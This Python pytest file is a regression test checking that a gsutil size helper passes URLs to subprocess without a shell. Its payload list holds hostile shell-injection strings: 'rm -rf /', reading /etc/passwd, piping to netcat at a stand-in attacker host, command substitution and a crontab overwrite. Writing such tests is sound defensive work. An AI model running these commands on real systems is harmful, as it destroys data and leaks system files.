import pytest
from unittest.mock import patch

from utils.downloads import gsutil_getsize


ADVERSARIAL_PAYLOADS = [
    "gs://bucket/file; rm -rf /",
    "gs://bucket/file && cat /etc/passwd",
    "gs://bucket/file | nc attacker.com 4444",
    "gs://bucket/file`whoami`",
    "gs://bucket/file$(id)",
    "gs://bucket/file\nrm -rf /",
    "gs://bucket/file > /etc/crontab",
    "gs://bucket/file\x00; rm -rf /",
]


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_gsutil_getsize_no_shell_injection(payload):
    """Regression: gsutil_getsize() must not execute shell metacharacters in URL arguments."""
    mock_output = "1024  gs://bucket/file\n"

    with patch("utils.downloads.subprocess.check_output", return_value=mock_output) as mock_check:
        result = gsutil_getsize(payload)

        mock_check.assert_called_once()
        call_args, call_kwargs = mock_check.call_args

        assert call_kwargs.get("shell", False) is False, (
            f"SECURITY VIOLATION: gsutil_getsize() called subprocess with shell=True "
            f"for payload {payload!r}."
        )
        assert isinstance(call_args[0], (list, tuple)), (
            f"subprocess args must be a list/tuple, got {type(call_args[0])}"
        )
        assert payload in call_args[0], (
            f"URL payload not passed as a literal argument: {payload!r}"
        )
        assert result == 1024
